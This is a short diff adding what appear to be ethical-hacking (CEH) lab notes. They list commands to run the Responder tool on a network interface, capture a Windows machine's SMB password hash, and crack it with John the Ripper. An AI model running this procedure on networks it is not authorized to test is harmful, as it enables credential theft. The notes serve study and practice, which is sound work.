@@ -1,0 +1,9 @@
+cd Responder
+chmod +x Responder.py
+chmod -R 755 Responder.py
+python3 Responder.py -I eth0 
+
+Windows machine logged in \\CEH-TOOLS
+Find hash text under Responder and store in SMB file log
+
+john <log file with hash> to find the password
